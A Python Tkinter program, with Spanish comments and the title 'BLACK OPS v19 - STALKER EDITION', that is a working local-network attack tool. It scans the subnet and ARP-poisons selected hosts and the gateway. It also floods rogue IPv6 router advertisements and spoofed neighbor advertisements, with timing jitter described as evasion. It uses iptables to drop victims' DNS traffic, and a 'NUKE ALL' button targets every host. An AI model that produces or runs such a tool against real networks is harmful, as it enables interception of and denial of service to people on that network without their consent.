#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import multiprocessing
from queue import Empty
import time
import random
import subprocess
import os
import sys
import re
import signal

# Importamos sendp para manejo de Capa 2 (Ethernet)
from scapy.all import (ARP, Ether, send, sendp, srp, AsyncSniffer, 
                       DNS, DNSQR, IP, UDP, DNSRR, conf, 
                       get_if_addr, get_if_hwaddr,
                       IPv6, ICMPv6ND_RA, ICMPv6ND_NS, ICMPv6ND_NA,
                       ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo)

conf.verb = 0

# ==================== MOTOR IPv6 (Interactive NDP) ====================

def motor_ipv6_stalker(log_queue, control_event, net_info):
    mac_l = net_info['mac_l']
    ll_v6 = net_info['ll_v6']
    
    # RA con Prefijo y Bandera de Configuración (M/O)
    ra_pkt = (Ether(src=mac_l, dst="33:33:00:00:00:01")/
              IPv6(src=ll_v6, dst="ff02::1")/
              ICMPv6ND_RA(chlim=64, M=0, O=1, routerlifetime=1800)/
              ICMPv6NDOptSrcLLAddr(lladdr=mac_l)/
              ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefixlen=64, L=1, A=1))

    def ndp_callback(pkt):
        if pkt.haslayer(ICMPv6ND_NS):
            target_ip = pkt[ICMPv6ND_NS].tgt
            try:
                # Respondemos directamente a la MAC que pregunta (Unicast)
                na_resp = (Ether(src=mac_l, dst=pkt[Ether].src)/
                           IPv6(src=target_ip, dst=pkt[IPv6].src)/
                           ICMPv6ND_NA(tgt=target_ip, R=1, S=1, O=1)/
                           ICMPv6NDOptSrcLLAddr(lladdr=mac_l))
                sendp(na_resp, verbose=0, count=1)
            except: pass

    try:
        sniffer = AsyncSniffer(filter="icmp6", prn=ndp_callback, store=0)
        sniffer.start()
        while not control_event.is_set():
            sendp(ra_pkt, verbose=0)
            time.sleep(random.uniform(3.0, 6.0)) # Jitter para evasión
        if sniffer.running: sniffer.stop()
    except Exception as e:
        log_queue.put(f"Fallo Motor IPv6: {e}")

# ==================== MOTOR IPv4 (Silent ARP Poisoning) ====================

def motor_ataque_v19(targets_queue, log_queue, control_event, net_info):
    """
    Usa Capa 2 explícita para evitar warnings y broadcast innecesario.
    """
    try:
        ip_gw, mac_l, mac_gw = net_info['gw'], net_info['mac_l'], net_info['mac_gw']
        active_targets = {}

        while not control_event.is_set():
            try:
                while True:
                    ip, mac, active = targets_queue.get_nowait()
                    if active: active_targets[ip] = mac
                    else: active_targets.pop(ip, None)
            except Empty: pass

            if active_targets:
                for ip, mac in active_targets.items():
                    # PAQUETE 1: A la víctima le decimos que somos el Router
                    # Usamos dst=mac para evitar el warning de Scapy
                    p1 = Ether(src=mac_l, dst=mac) / ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_gw, hwsrc=mac_l)
                    
                    # PAQUETE 2: Al Router le decimos que somos la víctima
                    p2 = Ether(src=mac_l, dst=mac_gw) / ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip, hwsrc=mac_l)
                    
                    sendp([p1, p2], verbose=0, count=1)
                    del p1, p2 # Liberación de memoria inmediata
            
            time.sleep(random.uniform(0.9, 1.3))
    except Exception as e:
        log_queue.put(f"Fallo Motor IPv4: {e}")

# ==================== INTERFAZ DE CONTROL ====================

class AppMuro:
    def __init__(self, root):
        self.root = root
        self.root.title("BLACK OPS v19 - STALKER EDITION")
        self.root.geometry("1000x800")
        self.root.configure(bg="#020202")
        
        self.targets = {}
        self.queue_atk = multiprocessing.Queue()
        self.log_queue = multiprocessing.Queue()
        self.control_event = multiprocessing.Event()
        self.is_running = True

        if self.init_network():
            self.setup_ui()
            self.start_engines()
            self.update_logs() 
        else:
            messagebox.showerror("Error", "No se detectó configuración de red válida.")
            sys.exit(1)

    def init_network(self):
        try:
            route = subprocess.check_output(["ip", "route", "show", "default"]).decode()
            m = re.search(r"default via ([\d\.]+) dev ([\w\.-]+)", route)
            if not m: return False
            gw, iface = m.group(1), m.group(2)
            
            v6_cmd = subprocess.check_output(["ip", "-6", "addr", "show", "dev", iface, "scope", "link"]).decode()
            v6_match = re.search(r"inet6 (fe80::[\da-f:]+)", v6_cmd)
            ll_v6 = v6_match.group(1) if v6_match else "fe80::1"

            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=2, verbose=0)
            if not ans: return False
            
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
            subprocess.run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=1"], capture_output=True)

            self.net_info = {'gw': gw, 'iface': iface, 'mac_l': get_if_hwaddr(iface), 
                             'ip_l': get_if_addr(iface), 'mac_gw': ans[0][1].hwsrc, 'll_v6': ll_v6}
            return True
        except: return False

    def setup_ui(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Treeview", background="#0a0a0a", foreground="#0f0", fieldbackground="#0a0a0a")

        tk.Label(self.root, text="NETWORK STALKER v19 // SILENT MODE", bg="#111", fg="#0f0", font=("Consolas", 12)).pack(fill="x")
        
        f_btns = tk.Frame(self.root, bg="#020202", pady=10)
        f_btns.pack()
        tk.Button(f_btns, text="SCAN", command=self.scan, width=10, bg="#111", fg="#0f0").pack(side="left", padx=5)
        tk.Button(f_btns, text="NUKE ALL", command=self.attack_all, width=10, bg="#300", fg="white").pack(side="left", padx=5)
        tk.Button(f_btns, text="CLEAN", command=self.restore_all, width=10, bg="#003", fg="white").pack(side="left", padx=5)

        self.tree = ttk.Treeview(self.root, columns=("IP", "MAC", "STATE"), show="headings")
        for c in ("IP", "MAC", "STATE"): self.tree.heading(c, text=c)
        self.tree.pack(fill="both", expand=True, padx=15)
        self.tree.bind("<Double-1>", lambda e: self.toggle_selected())

        self.log_box = scrolledtext.ScrolledText(self.root, height=10, bg="black", fg="#0f0", font=("Consolas", 9))
        self.log_box.pack(fill="x", padx=15, pady=10)

    def log(self, msg):
        if self.is_running:
            self.log_box.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
            self.log_box.see(tk.END)

    def update_logs(self):
        if not self.is_running: return
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self.log(msg)
        except Empty: pass
        if self.root.winfo_exists(): self.root.after(500, self.update_logs)

    def start_engines(self):
        self.p_v4 = multiprocessing.Process(target=motor_ataque_v19, args=(self.queue_atk, self.log_queue, self.control_event, self.net_info))
        self.p_v6 = multiprocessing.Process(target=motor_ipv6_stalker, args=(self.log_queue, self.control_event, self.net_info))
        self.p_v4.daemon = True; self.p_v6.daemon = True
        self.p_v4.start(); self.p_v6.start()

    def scan(self):
        self.log("Escaneando...")
        self.targets.clear()
        for i in self.tree.get_children(): self.tree.delete(i)
        red = self.net_info['gw'] + "/24"
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=red), timeout=2, verbose=0)
            for _, rcv in ans:
                if rcv.psrc != self.net_info['ip_l']:
                    self.targets[rcv.psrc] = {'mac': rcv.hwsrc, 'active': False}
                    self.tree.insert("", "end", iid=rcv.psrc, values=(rcv.psrc, rcv.hwsrc, "LIVE"))
        except: pass

    def toggle_selected(self):
        sel = self.tree.selection()
        if sel:
            ip = sel[0]
            target = self.targets.get(ip)
            state = not target['active']
            target['active'] = state
            self.tree.item(ip, values=(ip, target['mac'], "POISON" if state else "LIVE"))
            self.queue_atk.put((ip, target['mac'], state))
            
            # DNS Blackhole via Iptables
            cmd = ["iptables", "-I" if state else "-D", "FORWARD", "-s", ip, "-p", "udp", "--dport", "53", "-j", "DROP"]
            subprocess.run(cmd, capture_output=True)

    def attack_all(self):
        for ip in self.targets:
            if not self.targets[ip]['active']: self.toggle_selected_by_ip(ip)

    def toggle_selected_by_ip(self, ip):
        target = self.targets.get(ip)
        target['active'] = True
        self.tree.item(ip, values=(ip, target['mac'], "POISON"))
        self.queue_atk.put((ip, target['mac'], True))
        subprocess.run(["iptables", "-I", "FORWARD", "-s", ip, "-p", "udp", "--dport", "53", "-j", "DROP"], capture_output=True)

    def restore_all(self):
        subprocess.run(["iptables", "-F"], capture_output=True)
        self.log("Filtros limpiados.")

    def on_close(self):
        self.is_running = False
        self.control_event.set()
        for p in [self.p_v4, self.p_v6]:
            if p.is_alive(): os.kill(p.pid, signal.SIGTERM)
        self.restore_all()
        self.root.destroy()

if __name__ == "__main__":
    if os.geteuid() != 0: 
        print("SUDO REQUERIDO"); sys.exit(1)
    multiprocessing.freeze_support()
    root = tk.Tk()
    app = AppMuro(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()
